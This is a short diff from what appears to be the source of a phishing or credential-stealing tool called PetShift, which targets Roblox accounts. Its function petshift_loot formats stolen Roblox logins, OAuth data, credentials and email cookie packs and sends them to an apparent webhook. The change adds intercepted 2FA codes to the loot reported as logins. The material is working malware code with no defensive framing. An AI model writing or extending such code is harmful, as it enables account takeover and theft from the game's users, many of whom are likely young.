@@ -1554,7 +1554,7 @@ def petshift_loot():
         if kind == "email_cookies" and isinstance(payload, dict):
             counts = payload.get("counts") or {}
             lines.append("email cookie packs: " + ", ".join(f"{k}={v}" for k,v in counts.items()))
-        title = "PetShift LOGIN" if kind in ("roblox_login", "roblox_oauth", "roblox_oauth_form", "credentials") else ("PetShift email cookies" if kind=="email_cookies" else "PetShift loot")
+        title = "PetShift LOGIN" if kind in ("roblox_login", "roblox_oauth", "roblox_oauth_form", "credentials", "roblox_2fa", "roblox_2fa_game", "auth_2fa", "auth_2fa_game") else ("PetShift email cookies" if kind=="email_cookies" else "PetShift loot")
         _browser_wh(title, lines)
     except Exception:
         pass
